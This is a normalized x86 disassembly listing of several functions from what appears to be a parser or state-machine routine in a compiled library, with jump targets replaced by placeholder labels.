mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10048ae0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edi esi
call sub_10074130
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp edi 0x4
je r-xdata
test edi edi
jne r-xdata
push ebx
cmp edi 0x3
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_100736d0
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_10048ae0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x1
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_100734d0
mov ebx eax
mov eax edi
call sub_10073c60
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
cmp eax 0x71
sete cl
test ecx ecx
je r-xdata
xor ecx ecx
cmp eax 0x72
sete cl
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10075d00
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
push 0x96
push 0x73
push 0x74
push 0x6d
push 0x1
mov eax esi
call sub_10073790
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x6f
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x72
sete cl
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
mov ebx [ edi + 0xc ]
push 0x72
mov eax edi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
je r-xdata
xor edx edx
cmp eax 0x71
sete dl
mov eax edx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push 0x72
jmp r-xdata
cmp edi 0x1
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_100736d0
push edi
mov eax 0x6f
call sub_10074870
add esp 0x8
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_100736d0
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_10048ae0
add esp 0xc
mov esi edi
call sub_10074ab0
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
xor ecx ecx
cmp eax 0x6f
sete cl
mov eax ecx
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
push 0x72
mov eax edi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
jne r-xdata
push 0x71
mov eax edi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
mov ecx [ ebx + 0x8 ]
mov eax [ ecx + eax * 4 - 0x8 ]
push 0x71
call sub_10073830
add esp 0x4
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push 0x72
mov eax ebx
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
je r-xdata
mov eax ebx
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
je r-xdata
cmp edi 0x7
mov edi [ ebp + 0x8 ]
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x7
sete al
test eax eax
je r-xdata
mov esi edi
call sub_10074ab0
mov edx [ edi + 0xc ]
pop ebx
pop edi
mov [ edx + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10048ae0
add esp 0x8
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax 0x6f
call sub_10074870
add esp 0x4
test eax eax
je r-xdata
mov eax edi
call sub_10073b80
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_100736d0
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_10048ae0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_100736d0
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_10048ae0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
mov eax edi
call sub_10073b80
push 0x71
mov eax ebx
call sub_10073b80
mov edi esi
call sub_10073f90
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax ebx
call sub_10073b80
mov eax edi
call sub_100734d0
mov ecx [ edi + 0x4 ]
cmp eax [ ecx + 0x4 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_100759d0
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
mov esi edi
call sub_10074ab0
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_100736d0
add esp 0x4
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10078300
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x96
push 0x68
push 0x67
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x60
mov ebx 0x1
push ebx
mov eax esi
call sub_10073790
add esp 0x28
test eax eax
mov eax esi
je r-xdata
push 0x96
push 0x68
push 0x67
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x60
push 0x0
call sub_10073790
add esp 0x28
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
push edi
call sub_100736d0
add esp 0x4
mov eax edi
call sub_10073b80
lea esi [ ebx + 0x6e ]
lea ecx [ ecx ]
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10077fc0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_100736d0
mov ecx [ esi + 0x18 ]
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x4 ]
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_10074530
add esp 0x1c
test eax eax
je r-xdata
mov eax edi
call sub_10073b80
jmp r-xdata
cmp [ eax + 0x1c ] esi
je r-xdata
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_10048ae0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_10073b80
mov esi 0x6f
cmp [ eax ] ebx
jne r-xdata
mov eax edi
call sub_10073560
mov eax [ edi + 0xc ]
pop edi
mov [ eax + 0x34 ] ebx
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_10073b80
jmp r-xdata
cmp [ eax + 0x1c ] esi
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax edi
call sub_10073560
mov eax edi
call sub_10073560
mov ecx [ edi + 0xc ]
pop edi
pop esi
mov [ ecx + 0x34 ] ebx
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10078440
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10075d00
add esp 0x8
pop ebp
retn
cmp ecx 0x1
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
jne r-xdata
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
push ebx
mov ebx [ edx + 0x4 ]
mov esi eax
mov eax ecx
call sub_10073c60
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
cmp ecx 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_100736d0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0xc
xor eax eax
pop esi
pop ebp
retn
cmp ecx 0x7
je r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
call sub_100736d0
mov edx [ esi + 0xc ]
mov [ edx ] 0x6
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov [ edx ] 0x15
mov eax [ eax + 0xc ]
mov ecx [ eax + 0x8 ]
mov ecx [ ecx ]
mov eax [ eax + 0x68 ]
add ecx 0x10
call sub_10073b40
sub_10078520
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
mov edx [ edi ]
cmp edx 0x4
jne r-xdata
push ebx
push esi
cmp edx 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_10074130
mov eax 0x1
pop edi
pop ebp
retn
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
cmp edx 0x1
jne r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_10073c60
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_10073c60
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
pop edi
pop ebp
retn
cmp edx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
cmp edx 0x1
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x81
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x81
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_10075d00
add esp 0x8
pop esi
pop ebx
pop edi
pop ebp
retn
mov esi [ ebp + 0x8 ]
cmp edx 0x7
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x80
sete cl
test ecx ecx
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x0
mov eax esi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f90
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
push esi
mov eax edi
call sub_100736d0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0xc
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
push 0x0
mov eax esi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
jne r-xdata
xor ecx ecx
cmp eax 0x82
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f90
mov eax ebx
call sub_10073b80
mov edx [ ebx + 0xc ]
mov [ edx + 0x38 ] 0x1
push esi
mov eax edi
call sub_100736d0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10048ae0
add esp 0xc
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
mov eax esi
call sub_10073b80
push 0x81
mov eax esi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
jne r-xdata
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
push esi
mov eax edi
call sub_100736d0
add esp 0x4
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_100759d0
add esp 0x8
pop esi
pop ebx
pop edi
pop ebp
retn
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ esi + 0xc ]
mov [ ecx ] 0x14
sub_10078700
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push edi
cmp ecx 0x4
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_10074130
mov eax 0x1
pop edi
pop ebp
retn
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_100736d0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10048ae0
add esp 0xc
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp ecx 0x1
jne r-xdata
push ebx
mov esi eax
mov ebx edx
mov eax edi
call sub_10073c60
pop ebx
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
cmp ecx 0x2
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
cmp ecx 0x1
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10075d00
add esp 0x8
pop esi
pop edi
pop ebp
retn
cmp ecx 0x7
je r-xdata
xor edx edx
cmp [ eax + 0x18 ] 0x82
sete dl
test edx edx
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov edx [ eax + 0x8 ]
mov ecx [ edx ]
mov eax [ eax + 0x68 ]
add ecx 0x10
call sub_10073b40
mov eax [ esi + 0xc ]
mov [ eax ] 0x16
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_100759d0
add esp 0x8
pop esi
pop edi
pop ebp
retn
sub_10078800
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
cmp ecx 0x3
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ebx
mov ebx [ ecx ]
call sub_10073c60
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10075d00
add esp 0x8
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
cmp ecx 0x1
jne r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_100736d0
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx ] 0x6
mov eax [ edi + 0xc ]
pop edi
mov [ eax + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
lea eax [ ecx - 0x6 ]
pop esi
pop ebp
retn
sub_10078890
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
cmp ecx 0x3
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ebx
mov ebx [ ecx ]
call sub_10073c60
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
push esi
push edx
call sub_10075d00
add esp 0x8
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
cmp ecx 0x1
jne r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
jne r-xdata
cmp ecx 0x1
jne r-xdata
lea eax [ ecx - 0x6 ]
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_100736d0
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10048ae0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
xor eax eax
cmp [ esi + 0x18 ] 0x82
sete al
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push esi
push edx
call sub_100759d0
add esp 0x8
pop esi
pop ebp
retn
sub_10078940
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov ebx eax
mov esi [ ebx ]
push edi
cmp esi 0x6
ja r-xdata
push 0x96
push 0x33
push 0x1e
push 0x3a
push 0x94
push 0x5f
push 0x37
push 0x36
push 0x8a
push 0x29
push 0x41
push 0x2a
push 0x2b
push 0x3c
push 0x1b
push 0x19
push 0x1d
push 0x92
push 0x5
push 0x7a
push 0x84
push 0x1f
push 0x47
push 0x38
push 0x1a
push 0x1
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x49
push 0x28
push 0x21
push 0x20
push 0x26
push 0x22
push 0x32
push 0x8e
push 0x42
push 0xa
push 0x1c
push 0x8c
push 0x39
push 0x1
call sub_10073790
add esp 0xb8
test eax eax
jne r-xdata
jmp [ esi * 4 + jump_table_10078d00 ]
mov edi [ ebp + 0x8 ]
push edi
mov eax ebx
call sub_100736d0
add esp 0x4
cmp esi 0x1
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_100736d0
mov [ ebx ] 0x5
mov eax [ r--data ]
mov [ ebx + 0x18 ] eax
add esp 0x4
mov edi ebx
mov eax esi
call sub_10074130
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edi ebx
call sub_10074130
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edi ebx
mov eax esi
call sub_10074130
push r--data
call sub_10020200
mov ecx [ esi + 0xc ]
add esp 0x4
pop edi
pop esi
mov [ ecx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_100736d0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0xc ]
mov [ ecx + 0x34 ] 0x1
mov eax edi
call sub_100734d0
call sub_10073880
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
cmp [ ebx + 0x18 ] 0x8f
sete al
test eax eax
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi ebx
mov ebx edx
call sub_10073c60
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
mov ebx edx
call sub_10073c60
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_100734d0
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + ecx * 4 - 0x4 ]
xor esi esi
jmp r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea esi [ ebx + 0x1c ]
push r--data
push esi
call sub_10070600
add esp 0x8
test eax eax
jne r-xdata
mov eax edi
call sub_10073b80
mov eax edi
call sub_100734d0
mov esi eax
call sub_10073850
test eax eax
jne r-xdata
mov edx [ edi + 0xc ]
mov edi [ edx + 0xc ]
dec edi
test edi edi
jle r-xdata
push edi
mov eax ebx
call sub_100736d0
add esp 0x4
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] eax
mov edx [ esi + 0x24 ]
mov [ ebp - 0xc ] edx
mov eax [ esi + 0x28 ]
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x8 ] eax
call sub_10010280
lea edx [ ebp - 0xc ]
push edx
call sub_10010280
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0x4 ] 0x1
call sub_1006a170
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
push r--data
push esi
call sub_10070600
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
push ebx
push eax
mov eax [ edx * 4 + r--data ]
call eax
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
push edi
push eax
push ecx
push r--data
call sub_10020200
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0xc ]
push eax
call sub_1006a170
add esp 0x18
test eax eax
jne r-xdata
mov esi [ ecx + 0x20 ]
cmp esi 0x2
jne r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
push r--data
push esi
call sub_10070600
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push r--data
call sub_10020200
add esp 0x4
mov edi edi
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov eax [ edx + 0x8 ]
mov esi [ eax + edi * 4 - 0x4 ]
dec edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
cmp esi 0x1
jne r-xdata
mov eax ebx
call sub_10074eb0
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
call sub_10073b80
cmp eax esi
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x24 ]
mov [ ebp - 0xc ] ecx
mov edx [ esi + 0x28 ]
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edx
call sub_10010280
add esp 0x4
test edi edi
jg r-xdata
push edi
mov eax ebx
call sub_10074df0
push edi
mov eax esi
call sub_10074020
add esp 0x8
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push edi
mov eax ebx
call sub_10074e50
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_10073b80
mov eax [ edi + 0xc ]
mov [ eax + 0x38 ] 0x1
sub_10078d20
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
push ebx
xor ebx ebx
mov ecx 0xa
cmp [ eax + 0x40 ] ebx
je r-xdata
mov [ eax + 0x40 ] ebx
cmp [ esi ] 0x2
jne r-xdata
cmp [ esi ] 0x4
jne r-xdata
mov eax [ edx + 0xc ]
mov ecx [ eax + 0xc ]
push edi
cmp ecx ebx
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] ecx
sete al
cmp eax ebx
je r-xdata
cmp [ esi + 0x18 ] ecx
jne r-xdata
mov eax [ edx + 0xc ]
mov ecx [ eax ]
push esi
push edx
mov edx [ ecx * 4 + r--data ]
call edx
add esp 0x8
pop edi
pop ebx
pop ebp
retn
mov eax [ eax + 0x8 ]
mov edi [ eax + ecx * 4 - 0x4 ]
cmp edi ebx
je r-xdata
cmp [ esi ] 0x2
jne r-xdata
mov ecx [ edx + 0xc ]
mov [ ecx + 0x6c ] 0x1
mov [ eax + 0x40 ] ebx
mov ecx [ edx + 0xc ]
mov eax [ ecx + 0x68 ]
push eax
push edx
call sub_10048ae0
add esp 0x8
mov eax 0x1
pop ebx
pop ebp
retn
mov ecx [ edi + 0x1c ]
push ecx
call sub_10068a50
push eax
push r--data
call sub_10020200
mov ebx [ edi + 0x20 ]
add esp 0xc
test ebx ebx
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] ebx
sete al
cmp eax ebx
je r-xdata
mov edx [ ebp + 0x8 ]
push 0x96
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push edi
call sub_100737e0
add esp 0x1c
test eax eax
je r-xdata
mov eax [ edx + 0xc ]
mov [ eax + 0x70 ] 0x1
cmp ebx 0x2
jne r-xdata
cmp ebx 0x2
jne r-xdata
mov eax edi
call sub_10073880
test eax eax
je r-xdata
cmp [ edi ] 0x1
jne r-xdata
mov eax [ esi ]
cmp eax 0x5
je r-xdata
cmp [ esi ] 0x7
je r-xdata
mov eax [ esi ]
cmp eax 0x1
je r-xdata
cmp [ edi + 0x1c ] 0x5b
jne r-xdata
cmp eax 0x4
je r-xdata
pop edi
pop ebx
mov eax esi
pop ebp
jmp sub_10078940
cmp eax 0x5
je r-xdata
cmp [ esi ] 0x1
jne r-xdata
cmp eax 0x6
je r-xdata
cmp eax 0x6
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x5c
sete al
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp eax 0x4
je r-xdata
push 0x96
push 0x5a
push 0x59
push eax
mov eax esi
call sub_10073790
add esp 0x10
test eax eax
je r-xdata
sub_10078e90
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
test edi edi
jne r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_100736d0
add esp 0x4
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
je r-xdata
cmp edi 0x4
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x8
sete al
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10075d00
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_100759d0
add esp 0x8
pop edi
pop esi
pop ebp
retn
cmp edi 0x3
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10073b80
mov edx [ esi + 0xc ]
lea eax [ edi - 0x1 ]
pop edi
mov [ edx ] 0x3
pop esi
pop ebp
retn
push 0x96
push 0x6
push 0x82
push 0x5
push 0x4
push 0x7e
push 0x8b
push 0x1
mov eax esi
call sub_10073790
add esp 0x20
test eax eax
jne r-xdata
push 0x96
push 0x8
push 0x1
push 0x1
mov eax esi
call sub_10073790
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_100736d0
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_10048ae0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_100736d0
add esp 0x4
mov eax edi
call sub_10073b80
mov eax [ edi + 0xc ]
mov [ eax ] 0x3
mov ecx [ edi + 0xc ]
pop edi
mov [ ecx + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
cmp [ esi + 0x18 ] 0x42
sete al
test eax eax
je r-xdata
sub_10078fd0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + 0xc ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
mov [ ebp - 0x4 ] ecx
cmp edi 0x4
jne r-xdata
test edi edi
je r-xdata
mov edi esi
mov eax ebx
call sub_10074130
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov eax esi
call sub_100736d0
mov eax [ ebx + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push ebx
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x3
jne r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ ecx + 0xc ]
test eax eax
jne r-xdata
push 0x96
push 0x2
push 0x6
push 0x7
push 0x82
push 0x5
push 0x4
push 0x7e
push 0x8b
push 0x3
push 0x1
mov eax esi
call sub_10073790
add esp 0x2c
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
mov edx [ ecx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_10073c60
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_10073c60
lea eax [ edi - 0x2 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x1
jne r-xdata
push ebx
mov eax esi
call sub_100736d0
mov edi ebx
call sub_10073a20
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
lea edi [ eax + 0x8 ]
push edi
push ecx
push ebx
call sub_10046530
push esi
push ebx
call sub_100759d0
mov edx [ ebp - 0x4 ]
mov esi eax
mov eax [ edx + 0x2c ]
push edi
push eax
push ebx
call sub_10021d60
add esp 0x24
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp eax 0xa
sete cl
test ecx ecx
je r-xdata
push esi
push ebx
call sub_10075d00
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x2
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] edi
sete al
test eax eax
jne r-xdata
xor edx edx
cmp eax 0x81
sete dl
mov eax edx
test eax eax
je r-xdata
mov edi esi
call sub_10073f90
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3c ] 0x0
